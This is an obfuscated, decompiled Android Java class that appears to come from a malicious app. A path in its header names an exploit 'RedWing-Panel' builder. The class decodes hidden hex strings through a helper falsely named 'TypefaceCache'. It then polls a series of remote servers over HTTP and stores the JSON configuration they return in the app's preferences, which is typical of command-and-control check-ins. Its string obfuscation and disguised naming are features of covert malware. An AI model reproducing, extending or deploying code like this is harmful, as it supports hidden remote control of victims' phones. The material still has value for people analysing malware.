package v.s;

import android.content.SharedPreferences;
import app.mobilex.plus.util.TypefaceCache;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import org.json.JSONArray;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class vZ4OhuaiT7CDwoKF9 extends jh03IwKTfxTtT1U implements NhN5GSKLYh6STld4 {
    public final /* synthetic */ long ibVTtJUNfrGYbW;
    public final /* synthetic */ SharedPreferences xDyLpEZyrcKVe0;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public vZ4OhuaiT7CDwoKF9(SharedPreferences sharedPreferences, long j, b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q) {
        super(2, b9xroaxfr1fmoo2q);
        this.xDyLpEZyrcKVe0 = sharedPreferences;
        this.ibVTtJUNfrGYbW = j;
    }

    private static /* synthetic */ void gqkdcpll() {
    }

    @Override // v.s.NhN5GSKLYh6STld4
    public final Object b1EoSIRjJHO5(Object obj, Object obj2) {
        vZ4OhuaiT7CDwoKF9 vz4ohuait7cdwokf9 = (vZ4OhuaiT7CDwoKF9) dDIMxZXP1V8HdM((wh3Lv6S5rs6zqjV) obj, (b9xRoaXFR1fmOO2Q) obj2);
        Eo0e0FTdv96U7KeCzoB eo0e0FTdv96U7KeCzoB = Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
        vz4ohuait7cdwokf9.vekpFI4d1Nc4fakF(eo0e0FTdv96U7KeCzoB);
        return eo0e0FTdv96U7KeCzoB;
    }

    @Override // v.s.CWIOrUfHtKyaxQib0W
    public final b9xRoaXFR1fmOO2Q dDIMxZXP1V8HdM(Object obj, b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q) {
        return new vZ4OhuaiT7CDwoKF9(this.xDyLpEZyrcKVe0, this.ibVTtJUNfrGYbW, b9xroaxfr1fmoo2q);
    }

    @Override // v.s.CWIOrUfHtKyaxQib0W
    public final Object vekpFI4d1Nc4fakF(Object obj) {
        Eo0e0FTdv96U7KeCzoB eo0e0FTdv96U7KeCzoB;
        Eo0e0FTdv96U7KeCzoB eo0e0FTdv96U7KeCzoB2 = Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
        String str = "002500770057008B00F200BE00D100AC001C0066005A008900F500B3";
        SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
        ArrayList arrayList = new ArrayList();
        String strDDIMxZXP1V8HdM = KV57Z6oavcB595B8Dy8Z.dDIMxZXP1V8HdM(58);
        if (BS2kx9eAoOyDiNGAFlFk.euF5Udt5Rqv3Qmea(strDDIMxZXP1V8HdM) || KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(strDDIMxZXP1V8HdM, TypefaceCache.obtain("001A0059006E00B500CF008C00F70095001500530069"), false)) {
            strDDIMxZXP1V8HdM = null;
        }
        if (strDDIMxZXP1V8HdM != null) {
            arrayList.add(strDDIMxZXP1V8HdM);
        }
        try {
            String[] strArr = KV57Z6oavcB595B8Dy8Z.dDIMxZXP1V8HdM;
            ArrayList arrayList2 = new ArrayList();
            for (String str2 : strArr) {
                if (!BS2kx9eAoOyDiNGAFlFk.euF5Udt5Rqv3Qmea(str2)) {
                    arrayList2.add(str2);
                }
            }
            int size = arrayList2.size();
            int i = 0;
            while (i < size) {
                Object obj2 = arrayList2.get(i);
                i++;
                arrayList.add((String) obj2);
            }
        } catch (Exception unused) {
        }
        int size2 = arrayList.size();
        int i2 = 0;
        while (i2 < size2) {
            int i3 = i2 + 1;
            try {
                eo0e0FTdv96U7KeCzoB = eo0e0FTdv96U7KeCzoB2;
                try {
                    HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(((String) arrayList.get(i2)) + TypefaceCache.obtain("006C0077004B008E00BF00BD00DD00A800370065004F009500F100AF008D00B3002A00720006") + KV57Z6oavcB595B8Dy8Z.dDIMxZXP1V8HdM(61) + TypefaceCache.obtain("006500740052008300AD") + KV57Z6oavcB595B8Dy8Z.dDIMxZXP1V8HdM(62)).openConnection();
                    ktukzhfmAkOuMU ktukzhfmakoumu = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                    ktukzhfmAkOuMU.xDyLpEZyrcKVe0(httpURLConnection);
                    httpURLConnection.setConnectTimeout(5000);
                    httpURLConnection.setReadTimeout(5000);
                    httpURLConnection.setRequestProperty(TypefaceCache.obtain("00160065005E009500BD009E00D500A2002D0062"), TypefaceCache.obtain("000E00790041008E00FC00B300D300E800760038000B"));
                    if (httpURLConnection.getResponseCode() == 200) {
                        String strPyu8ovAipBTLYAiKab = RIZfHbqXpth8r2yN4.pyu8ovAipBTLYAiKab(new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream(), N4h1mGVqsY6M8lTtB.dDIMxZXP1V8HdM), 8192));
                        httpURLConnection.disconnect();
                        JSONObject jSONObject = new JSONObject(strPyu8ovAipBTLYAiKab);
                        SharedPreferences.Editor editorEdit = this.xDyLpEZyrcKVe0.edit();
                        String strOptString = jSONObject.optString(TypefaceCache.obtain("003300770055008200FC008000C700B5002F"), "");
                        if (BS2kx9eAoOyDiNGAFlFk.euF5Udt5Rqv3Qmea(strOptString)) {
                            strOptString = null;
                        }
                        if (strOptString != null) {
                            editorEdit.putString(TypefaceCache.obtain("003300770055008200FC008000C700B5002F"), strOptString);
                        }
                        String strOptString2 = jSONObject.optString(TypefaceCache.obtain("00350078005800B800E500AD00DE"), "");
                        if (BS2kx9eAoOyDiNGAFlFk.euF5Udt5Rqv3Qmea(strOptString2)) {
                            strOptString2 = null;
                        }
                        if (strOptString2 != null) {
                            editorEdit.putString(TypefaceCache.obtain("00350078005800B800E500AD00DE"), strOptString2);
                        }
                        JSONArray jSONArrayOptJSONArray = jSONObject.optJSONArray(TypefaceCache.obtain(str));
                        if (jSONArrayOptJSONArray != null) {
                            ArrayList arrayList3 = new ArrayList();
                            int length = jSONArrayOptJSONArray.length();
                            int i4 = 0;
                            while (i4 < length) {
                                String strOptString3 = jSONArrayOptJSONArray.optString(i4, "");
                                String str3 = !BS2kx9eAoOyDiNGAFlFk.euF5Udt5Rqv3Qmea(strOptString3) ? strOptString3 : null;
                                if (str3 != null) {
                                    try {
                                        arrayList3.add(str3);
                                    } catch (Exception e) {
                                        e = e;
                                        ktukzhfmAkOuMU ktukzhfmakoumu2 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                        TypefaceCache.obtain("000100790054009300E300AB00C000A600330036005D008600F900B300D700A3006300700054009500B0");
                                        e.getMessage();
                                        i2 = i3;
                                        eo0e0FTdv96U7KeCzoB2 = eo0e0FTdv96U7KeCzoB;
                                        str = str;
                                    }
                                }
                                i4++;
                                str = str;
                            }
                            str = str;
                            editorEdit.putString(TypefaceCache.obtain(str), imhBI9RqzETHtVIJe.euF5Udt5Rqv3Qmea(arrayList3, "|", null, 62));
                        } else {
                            str = str;
                        }
                        JSONArray jSONArrayOptJSONArray2 = jSONObject.optJSONArray("gp");
                        if (jSONArrayOptJSONArray2 != null && jSONArrayOptJSONArray2.length() > 0) {
                            ArrayList arrayList4 = new ArrayList();
                            int length2 = jSONArrayOptJSONArray2.length();
                            for (int i5 = 0; i5 < length2; i5++) {
                                String strOptString4 = jSONArrayOptJSONArray2.optString(i5, "");
                                if (BS2kx9eAoOyDiNGAFlFk.euF5Udt5Rqv3Qmea(strOptString4)) {
                                    strOptString4 = null;
                                }
                                if (strOptString4 != null) {
                                    arrayList4.add(strOptString4);
                                }
                            }
                            editorEdit.putString("gp", imhBI9RqzETHtVIJe.euF5Udt5Rqv3Qmea(arrayList4, "|", null, 62));
                        }
                        editorEdit.putLong("ts", this.ibVTtJUNfrGYbW);
                        editorEdit.apply();
                        ktukzhfmAkOuMU ktukzhfmakoumu3 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                        ktukzhfmAkOuMU.gmNWMfvn6zlEj = true;
                        ktukzhfmAkOuMU.gIIiyi2ddlMDR0 = this.ibVTtJUNfrGYbW;
                        TypefaceCache.obtain("000100790054009300E300AB00C000A6003300360058008800FE00B900DB00A000630064005E008400F500B600C400A200270036005D009500FF00B20092");
                        return eo0e0FTdv96U7KeCzoB;
                    }
                    try {
                        str = str;
                        httpURLConnection.disconnect();
                    } catch (Exception e2) {
                        e = e2;
                        ktukzhfmAkOuMU ktukzhfmakoumu4 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                        TypefaceCache.obtain("000100790054009300E300AB00C000A600330036005D008600F900B300D700A3006300700054009500B0");
                        e.getMessage();
                    }
                    i2 = i3;
                    eo0e0FTdv96U7KeCzoB2 = eo0e0FTdv96U7KeCzoB;
                    str = str;
                    e = e2;
                } catch (Exception e3) {
                    e = e3;
                    str = str;
                    ktukzhfmAkOuMU ktukzhfmakoumu5 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                    TypefaceCache.obtain("000100790054009300E300AB00C000A600330036005D008600F900B300D700A3006300700054009500B0");
                    e.getMessage();
                    i2 = i3;
                    eo0e0FTdv96U7KeCzoB2 = eo0e0FTdv96U7KeCzoB;
                    str = str;
                }
            } catch (Exception e4) {
                e = e4;
                eo0e0FTdv96U7KeCzoB = eo0e0FTdv96U7KeCzoB2;
            }
            ktukzhfmAkOuMU ktukzhfmakoumu6 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
            TypefaceCache.obtain("000100790054009300E300AB00C000A600330036005D008600F900B300D700A3006300700054009500B0");
            e.getMessage();
            i2 = i3;
            eo0e0FTdv96U7KeCzoB2 = eo0e0FTdv96U7KeCzoB;
            str = str;
        }
        return eo0e0FTdv96U7KeCzoB2;
    }
}
